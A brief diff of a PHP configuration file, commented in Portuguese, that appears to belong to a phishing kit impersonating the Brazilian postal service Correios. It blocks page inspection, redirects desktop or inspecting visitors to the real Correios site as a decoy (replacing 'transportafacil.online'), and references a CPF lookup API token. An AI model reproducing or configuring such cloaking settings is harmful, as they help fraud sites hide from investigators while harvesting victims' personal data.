@@ -54,7 +54,7 @@ $config_permitir_inspecionar = 0;
 
 // Link de escape. Deve ficar entre aspas. 
 // Se alguém tentar inspecionar ou ver a página pelo computador sem a permição, o site vai redirecionar para o link de escape. 
-$config_link_escape = 'https://transportafacil.online';
+$config_link_escape = 'https://www.correios.com.br';
 
 // Token da API de CPF
 // Painel da API: hubdodesenvolvedor.com.br
